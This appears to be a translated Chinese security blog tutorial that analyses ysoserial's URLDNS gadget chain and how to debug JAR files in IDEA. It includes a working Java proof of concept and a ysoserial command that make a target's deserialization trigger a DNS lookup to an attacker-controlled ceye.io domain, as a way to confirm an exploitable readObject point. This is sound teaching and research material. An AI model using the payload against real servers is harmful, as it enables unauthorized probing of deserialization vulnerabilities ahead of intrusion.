# JAVA反序列化-ysoserial-URLDNS
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
推荐阅读时间：15min
内容-基础向：
  * 在IDEA中JAR的三种调试方式
  * Ysoserial工具中URLDNS模块的原理分析
  * POC代码以及Ysoserial的源码分析
## 在IDEA中JAR的三种调试方式
在开始前，先分享下对于jar文件的三种调试方式。
###  JAR起端口的远程调试
这种调试方式主要针对有界面，启动后不会自动退出的一类jar包。如attackRMI.jar
  1. 1.调试运行jar，这将会使jar起一个5005端口等待调试器连接
    java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar attackRMI.jar
  1. 2.idea随便一个项目引入这个jar包
  1. 3.IDEA调试配置处，配置Remote监听配置——Attach to remote JVM
  1. 4.在需要调试的jar包中下断点，选择远程调试器，DEBUG开始调试
> 可以注意到在配置调试器连接远程监听的时候，有远程JVM的命令代码，如果jdk版本是8以上命令会有所不同，可以手动选择 然后替换命令跑jar。
###  调试器起端口的远程调试
但是遇到一些运行后就立马结束退出的情况，比如ysoserial，以上的方法jar起端口等待调试器连接的办法就不成了。（因为立刻退出了，调试器根本来不及连接）
我们可以换一种方式反一反：让IDEA调试器起端口监听，jar连接至调试端口进行调试
  1. 1.IDEA配置监听远程调试——Listen to remote JVM
  1. 2.IDEA下断点，开始调试DEBUG，这样IDEA就会起一个5055监听端口
  2. 3.调试运行JAR，使JAR连接至IDEA-DEGUB端口进行调试：
    java -agentlib:jdwp=transport=dt_socket,server=n,address=LAPTOP-50N17D1J:5005,suspend=y  -jar F:BanZjavaysoserial.jar
> 以上的命令不是大家都通用的，可以从IDEA里面复制出来，删除<>的两项可选项即可。
>
> 同样根据jdk版本不同，命令也会有变化。
###  JAR源代码调试
通常来说以上两种就够用了，但是还有一种调试方式，在局部调试中更为方便：在源代码中调用特定class文件的main函数进行调试：
以ysoserial的URLDNS模块为例，由于在ysoserial中所有payload生成接口都可以从`ysoserial.GeneratePayload`进入，我们可以调用该类的main函数同时指定参数，进入任意payload生成模块。
看一下GeneratePayload的main函数：
  1. 1.IDEA配置固定class文件，配置传入参数（跟命令行调用一样）
  1. 2.下断点，开始DEBUG调试
## URLDNS
那么开始细看[ysoserial](https://github.com/frohoff/ysoserial)，从最简单的模块开始。
在渗透测试中，如果对着服务器打一发JAVA反序列化payload，而没有任何回应，往往就不知道问题出在了哪里的蒙蔽状态。
  * 1.打成功了，只是对方机器不能出网？
  * 2.还是对面JAVA环境与payload版本不一样，改改就可以？
  * 3.还是对方没有用这个payload利用链的所需库？利用链所需库的版本不对？换换就可以？
  * 4.还是…以上做的都是瞎操作，这里压根没有反序列化readobject点QAQ
而URLDNS模块正是解决了以上疑惑的最后一个，确认了readobject反序列化利用点的存在。不至于payload改来改去却发现最后是因为压根没有利用点所以没用。同时因为这个利用链不依赖任何第三方库，没有什么限制。
如果目标服务器存在反序列化动作（readobject），处理了我们的输入，同时按照我们给定的URL地址完成了DNS查询，我们就可以确认是存在反序列化利用点的。
从JAVA反序列化RCE的三要素（readobject反序列化利用点 + 利用链 + RCE触发点）来说，是通过（readobject反序列化利用点 +
DNS查询）来确认readobject反序列化利用点的存在。
ysoserial payload生成命令：`java -jar ysoserial.jar URLDNS "自己能够查询DNS记录的域名"`  
（这里可以使用ceye做DNS查询）
我们先抛开ysoserial，看一下网上的测试代码弄清楚原理，在之后再回过来看ysoserial的实现。
POC测试代码：
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.net.URL;
    import java.util.HashMap;
    public class URLDNS {
        public static void main(String[] args) throws Exception {
            //0x01.生成payload
            //设置一个hashMap
            HashMap hashMap = new HashMap();
            //设置我们可以接受DNS查询的地址
            URL url = new URL("http://xxx.ceye.io");
            //将URL的hashCode字段设置为允许修改
            Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
            f.setAccessible(true);
            //**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**
            //1. 设置url的hashCode字段为0xdeadbeef（随意的值）
            f.set(url, 0xdeadbeef); 
            //2. 将url放入hashMap中，右边参数随便写
            hashMap.put(url, "rmb122");
            //修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）
            f.set(url, -1); 
            //0x02.写入文件模拟网络传输
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
            oos.writeObject(hashMap);
            //0x03.读取文件，进行反序列化触发payload
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
            ois.readObject();
        }
    }
在跑通以上代码，有几个注意点：
  1. 1.不能使用ip+端口进行回显，因为此处功能为DNS查询，ip+端口不属于DNS查询。同时在代码底层对于ip的情况做了限制，不会进行DNS查询。
  2. 2.最好不要使用burp自带的dns查询，会过一段时间就会变换了，可能会导致坑。这里使用了ceye查看DNSLOG
直接跑测试一波，有回显
从测试代码的 **0x01部分**
payload生成中，我们可以看个大概payload结构，但是也有一些蜜汁细节，回头再来追究，主要确认三个名词`HashMap`、`URL`、`HashCode`。
仔细看一下可以知道最终的payload结构是 一个`HashMap`，里面包含了 一个修改了`HashCode`为-1的`URL`类
那么具体细节我们就直接在`ois.readObject();`这个反序列化语句中去调试分析过程。
我们知道java反序列化的执行入口就是 **readObject方法**
，而我们最外层的包装就是HashMap，那么这个链自然是从HashMap的readObject开始的（这是JAVA反序列化的基础，不了解的话可以从以往的博客补课）。
找到JDK包中的HashMap类的readObject方法下断点，开始调试：
> 此处会有一个问题就是我们到底怎么在JDK包中找到HashMap这个类的readobject函数呢？因为JDK的类超级多，难道我们必须要一个个翻找？
>
> 其实搜索是可以搜索导入包的内容的，Ctrl+Shift+F 在Scope – All Places 搜索`class hashmap`即可
>
> 
然后我们就可以成功开始调试了，但是看着hashmap类中的代码马上就会一头雾水。因为我们根本不了解hashmap是啥。
###  HashMap
在开始正式调试阅读代码前，我们需要知道HashMap的大致原理：
[HashMap](https://blog.csdn.net/woshimaxiao1/article/details/83661464)是一种为提升操作效率的数据结构，本质在使用上还是存取key-value键值对的使用方式，但是在实现上引入了key值的HASH映射到一维数组的形式来实现，再进入了链表来解决hash碰撞问题（不同的key映射到数组同一位置）。
从键值对的设置和读取两方面来解释：
设置新键值对 key-value：
  1. 1.计算key的hash：Hash(k)
  2. 2.通过Hash(k)映射到有限的数组a的位置i
  3. 3.在a[i]的位置存入value
  4. 4.因为把计算出来的不同的key的hash映射到有限的数组长度，肯定会出现不同的key对应同一个数组位置i的情况。如果发现a[i]已经有了其他key的value，就放入这个i位置后面对应的链表（根据多少的情况可能变为树）中。
读取key的value：
  1. 1.计算key的hash：Hash(k)
  2. 2.通过Hash(k)映射到有限的数组a的位置i
  3. 3.读取在a[i]的位置的value
  4. 4.如果发现a[i]已经有了其他key的value，就遍历这个i位置后面对应的链表（根据多少的情况可能变为树）去查找这个key再去取值。
###  反序列化过程
那么这个Hashmap数据结构是如何序列化传输的呢？
`java.util.HashMap#writeObject`分为三个步骤进行序列化：
  1. 1.序列化写入一维数组的长度（不是特别确定，但是这个值在反序列化中是不使用的，所以不太重要）
  2. 2.序列化写入键值对的个数
  3. 3.序列化写入键值对的键和值；
`java.util.HashMap#readObject`：
    private void readObject(java.io.ObjectInputStream s)
             throws IOException, ClassNotFoundException
        {
            //...省略代码...
            //读取一维数组长度，不处理
            //读取键值对个数mappings
            //处理其他操作并初始化
            //遍历反序列化分辨读取key和value
            for (int i = 0; i < mappings; i++) {
                //URL类也有readObject方法，此处也会执行，但是DNS查询行为不在这，我们跳过
                    K key = (K) s.readObject();
                    V value = (V) s.readObject();
                //注意以下这句话
                putVal(hash(key), key, value, false, false);
            }
        }
`putVal`是往HashMap中放入键值对的方法，上面也说到在放入时会计算 **key的hash** 作为转化为数组位置 **i** 的映射依据。
**而DNS查询正是在计算URL类的对象的hash的过程中触发的** ，即hash(key)。